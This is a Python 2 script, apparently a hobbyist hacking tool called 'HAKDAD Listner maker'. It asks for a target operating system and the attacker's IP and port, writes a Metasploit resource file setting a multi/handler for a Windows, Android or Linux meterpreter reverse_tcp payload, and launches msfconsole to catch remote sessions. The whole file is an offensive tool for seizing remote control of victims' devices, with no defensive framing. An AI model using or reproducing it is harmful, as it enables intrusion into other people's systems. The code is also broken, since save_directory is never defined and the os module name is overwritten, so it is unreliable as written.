#! /usr/bin/python
#@mr_kali_hacker
############################################
############################################
#imports
from os import system
import sys
import signal
import os
import subprocess
import time
import socket
import random
################################################
#Code Time
from datetime import datetime
now = datetime.now()
hour = now.hour
minute = now.minute
day = now.day
month = now.month
year = now.year
###############################################
###############################################

##############################################
##############################################
os.system('clear')
os.system('apt install figlet -y')
os.system('apt install lolcat -y')
os.system('apt install toilet -y')
os.system("figlet _____________")
os.system('clear')
os.system("toilet -f big '   HAKDAD ' -F gay | lolcat")
os.system("toilet -f big 'Listner maker ' -F gay | lolcat")
print ("                                                     --version 1.0")
os.system("figlet /\/\/\/\/\/\/\/\/\/\/\/\/\/////////////////")
print
print (" Author NAME      :   VAMSI")
print (" YOUTUBE CHANNEL  :   HAKDAD")
print (" INSTAGRAM ID     :   Mr_kali_hacker")
print

os = raw_input("""\033[94m[*] \033[91mPLEASE \033[91mENTER TARGET OPERATING SYSTEM \n\t\t\t1.windows\n\t\t\t2.android\n\t\t\t3.linux\033[97m\n>>> \033[93m""")
                                       
ip_address = raw_input("\033[94m[*] \033[91mPLEASE \033[91m>> ENTER Your IP Address : \033[97m>>> \033[93m")
port_given = raw_input("\033[94m[*] \033[91mPLEASE \033[91m>> ENTER Port Number     : \033[97m>>> \033[93m")

if os == "1":
	payload = "windows/meterpreter/reverse_tcp"
	
if os == "3":
        payload = "linux/meterpreter/reverse_tcp"
	
if os == "2":
	payload = "android/meterpreter/reverse_tcp"
	
print("\n\n\t\033[94m[*]\033[91m Starting Metasploit Listener \033[93m[*]")


handler_file = "{0}handler.rc".format(save_directory)
f = open(handler_file, 'a')
handler_options = """use multi/handler
		                 set PAYLOAD {0}
		                 set LHOST {1}
		                 set LPORT {2}
		                 set ExitOnSession false
		                 exploit -j""".format(payload, ip_address, port_given)

f.write(handler_options)
f.close()
handler = "msfconsole -q -r {0}".format(handler_file)
system(handler)
